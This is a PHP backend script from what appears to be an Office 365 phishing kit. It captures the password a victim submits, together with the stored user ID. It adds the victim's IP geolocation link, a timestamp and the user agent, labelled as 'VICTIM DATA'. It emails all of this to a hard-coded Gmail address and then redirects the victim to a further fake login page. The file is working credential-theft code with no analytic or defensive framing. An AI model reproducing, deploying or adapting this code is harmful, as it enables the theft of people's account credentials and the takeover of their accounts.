﻿<?php
/*
***********************************************************
*                                                         *
*             Office 365 v1.8.3                           *
*                     For someone@example.com             *
*                                Office 365 v1.8.3        *
*                                                         *
*             Office 365 v1.8.3                           *
*                                                         *
***********************************************************
*/
session_start();
$_SESSION['_P'] =$_POST['passwd'];
$t = date('H:i:s d/m/Y');
include('./FUNC/get_browser.php');
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #827f84;'>365 LOGIN someone@example.com</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'>LOGIN DATA</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+] USERID] = <font style='color:#0a5d00;'>".$_SESSION['_L']."</font><br>
<font style='color:#9c0000;'>√</font> [+] PASSWD] = <font style='color:#0a5d00;'>".$_SESSION['_P']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #820fc4;'>VICTIM DATA</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>√</font> [+]IP INFO] = <font style='color:#0a5d00;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>√</font> [+]TIME/DATE] = <font style='color:#0a5d00;'>".$t."</font><br>
<font style='color:#9c0000;'>√</font> [+]User agent] = <font style='color:#0a5d00;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #827f84;'> Entrez2018 someone@example.com</font> #####################
</div></html>\n";
$Z118_SUBJECT = "LOGIN FROM  ".$_SESSION['_forlogin_']."";
        $Z118_HEADERS .= "From: Entrez2018 <someone@example.com>";
        $Z118_HEADERS .= $_POST['eMailAdd']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
        @mail("palmyshally01@gmail.com", $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
       HEADER("Location: ./login3.php");
?>